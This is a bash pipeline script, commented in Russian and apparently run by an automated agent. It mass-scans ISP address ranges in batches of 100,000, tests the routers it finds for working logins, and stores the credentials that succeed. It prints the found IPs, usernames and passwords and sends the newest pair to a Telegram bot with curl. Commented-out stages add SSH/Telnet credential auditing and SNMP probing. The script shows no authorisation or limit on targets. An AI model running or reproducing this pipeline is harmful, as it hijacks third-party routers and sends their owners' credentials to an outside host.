#!/bin/bash
# ============================================================================
# Auto pipeline: scan -> detect -> audit (raw+browser) -> sync -> notify
# Запуск: ./pipeline.sh [batch_size]  (по умолчанию 100000)
# ============================================================================
set -e
cd /root/scan
BATCH=${1:-100000}
AGENT="Agent-Arena-01"
TS=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
LOG="logs/pipeline_$(date -u +%Y%m%d_%H%M%S).log"

log() { echo "[$(date -u +%H:%M:%S)] $1" | tee -a "$LOG"; }

log "=== PIPELINE START ($TS, batch=$BATCH) ==="

# 1. sync
git pull --rebase origin main 2>&1 | tail -1 >> "$LOG" || true

# 2. lock
python3 agent_sync.py lock --agent "$AGENT" --task "Auto pipeline scan" \
  --step "Scanning $BATCH IP" --machine "aios-server" >> "$LOG" 2>&1 || true

# 3. scan
log "Сканирование $BATCH IP..."
python3 port_scanner.py run --batch "$BATCH" --concurrency 500 --timeout 2.0 >> "$LOG" 2>&1
log "Скан завершён."

# 4. find new routers count
NEW_RAW=$(python3 -c "
import sqlite3
conn = sqlite3.connect('isp_cidr.db')
print(conn.execute('SELECT COUNT(*) FROM scan_routers WHERE auth_checked=0').fetchone()[0])
conn.close()
")
NEW_BR=$(python3 -c "
import sqlite3
conn = sqlite3.connect('isp_cidr.db')
print(conn.execute('SELECT COUNT(*) FROM scan_routers WHERE browser_checked=0 AND auth_result=\"no-verifiable-channel\"').fetchone()[0])
conn.close()
")
log "Новых роутеров: raw=$NEW_RAW, browser=$NEW_BR"

# 5. raw audit (fast)
if [ "$NEW_RAW" -gt 0 ]; then
  log "Fast raw audit ($NEW_RAW устройств)..."
  python3 router_auth_check.py --fast --concurrency 30 --timeout 4 >> "$LOG" 2>&1 || true
fi

# 6. browser audit (fast)
if [ "$NEW_BR" -gt 0 ]; then
  log "Fast browser audit ($NEW_BR устройств)..."
  .venv/bin/python -u router_auth_browser.py --only-no-channel --pairs 8 \
    --concurrency 4 --timeout 7 --wait 2.5 >> "$LOG" 2>&1 || true
fi

# 7. SSH/Telnet audit — ОТКЛЮЧЕНО (по запросу)
# Для включения раскомментируйте блок ниже:
# SSH_N=$(python3 -c "
# import sqlite3, json
# conn = sqlite3.connect('isp_cidr.db')
# n = 0
# for r in conn.execute('SELECT extra_ports FROM scan_routers WHERE extra_ports IS NOT NULL'):
#     try:
#         ports = json.loads(r[0])
#     except Exception:
#         continue
#     if 22 in ports or 23 in ports:
#         n += 1
# conn.close()
# print(n)
# ")
# if [ "$SSH_N" -gt 0 ]; then
#   log "SSH/Telnet audit ($SSH_N устройств)..."
#   timeout 900 .venv/bin/python -u router_ssh_telnet_audit.py --concurrency 25 --timeout 5 >> "$LOG" 2>&1 || true
# fi

# 8. Port probe + SNMP — ОТКЛЮЧЕНО (по запросу)
# Для включения раскомментируйте:
# log "Port probe..."
# timeout 300 python3 port_probe.py --concurrency 50 --timeout 2 >> "$LOG" 2>&1 || true

# 9. results & notify
FOUND=$(python3 -c "
import sqlite3
conn = sqlite3.connect('isp_cidr.db')
print(conn.execute('SELECT COUNT(*) FROM router_credentials').fetchone()[0])
conn.close()
")
log "Найдено пар: $FOUND"
if [ "$FOUND" -gt 0 ]; then
  log "!!! НАЙДЕНЫ ПАРОЛИ — проверьте router_credentials !!!"
  python3 -c "
import sqlite3
conn = sqlite3.connect('isp_cidr.db')
conn.row_factory = sqlite3.Row
for r in conn.execute('SELECT ip, vendor, username, password, auth_method FROM router_credentials'):
    print('  НАХОДКА: %s %s %s/%s (%s)' % (r['ip'], r['vendor'], r['username'], r['password'] or '(пусто)', r['auth_method']))
conn.close()
" | tee -a "$LOG"
  # Telegram-уведомление (если настроен токен в .env)
  if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
    MSG="RouterScan: найдена пара $(python3 -c "
import sqlite3
conn = sqlite3.connect('isp_cidr.db')
r = conn.execute('SELECT ip, vendor, username, password FROM router_credentials ORDER BY id DESC LIMIT 1').fetchone()
conn.close()
print('%s %s %s/%s' % (r[0], r[1], r[2], r[3] or '(empty)'))
")"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
      -d chat_id="$TELEGRAM_CHAT_ID" -d text="$MSG" > /dev/null || true
  fi
else
  log "Паролей не найдено (все устройства закрыты)."
fi

# 10. complete + sync + push
python3 agent_sync.py complete --agent "$AGENT" --task "Auto pipeline scan" >> "$LOG" 2>&1 || true
python3 sync_manager.py "$AGENT" >> "$LOG" 2>&1 || true
log "=== PIPELINE DONE ==="
